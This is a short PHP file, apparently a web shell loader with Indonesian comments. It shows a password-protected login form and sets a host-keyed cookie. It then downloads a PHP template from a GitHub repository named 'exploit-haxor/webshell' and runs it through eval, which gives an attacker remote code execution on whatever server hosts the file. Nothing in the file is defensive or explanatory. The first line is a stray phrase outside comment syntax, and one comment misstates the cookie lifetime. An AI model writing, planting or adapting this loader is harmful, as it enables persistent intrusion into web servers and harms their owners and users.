<?php
password_verify untuk keamanan yang lebih baik gantenggantengheker
$hashed_password = '$2y$10$6ujs6prTrAaDbZ5QuGtztetA99UFOzRNrFURr1acgQsMB5kgHezfq';

// Fungsi untuk menampilkan form login
function admin_login() {
    echo '<title>Login</title>';
    echo '<form method="post">';
    echo '<input type="password" name="password">';
    echo '<input type="submit" value="Ganteng">';
    echo '</form>';
    exit;
}

if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])])) {
    // Memeriksa apakah password dikirim dan benar
    if(isset($_POST['password']) && password_verify($_POST['password'], $hashed_password)) {
        setcookie(md5($_SERVER['HTTP_HOST']), true, time() + 25200); // Cookie berlaku selama 1 jam
        // Logika setelah login berhasil
    } else {
        admin_login();
    }
}

$head = '<head><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="robots" content="noindex"><title>Dashboard</title><style>pre{border:1px solid #ddd;padding:5px;overflow:auto}table{border-collapse:collapse;width:100%;overflow:auto}th,td{padding:0.25rem;text-align:left;border-bottom:1px solid #ccc}tbody tr:nth-child(odd){background:#eee}tr:hover{background-color:#f5f5f5}</style></head>';
$url = "https://raw.githubusercontent.com/exploit-haxor/webshell/main/template.php";
$ch = curl_init($url); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);
eval("?>".$result);
?>
